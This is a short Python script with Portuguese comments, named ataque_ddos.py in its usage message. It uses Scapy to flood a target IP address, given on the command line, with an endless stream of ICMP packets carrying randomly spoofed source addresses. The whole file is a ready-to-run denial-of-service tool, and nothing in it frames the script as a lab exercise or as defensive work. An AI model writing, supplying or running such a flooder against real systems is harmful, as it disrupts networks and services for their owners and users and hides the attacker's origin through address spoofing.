from scapy.all import IP, ICMP, send, RandIP, RandMAC
import sys

def iniciar_ataque(alvo_ip):
    print(f"Lançando inundação de pacotes contra {alvo_ip}...")
    # Envia pacotes ICMP (ping) com IPs de origem aleatórios para confundir o switch
    send(IP(src=RandIP(), dst=alvo_ip)/ICMP(), loop=1, verbose=0)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 ataque_ddos.py <IP_DO_ALVO>")
    else:
        iniciar_ataque(sys.argv[1])
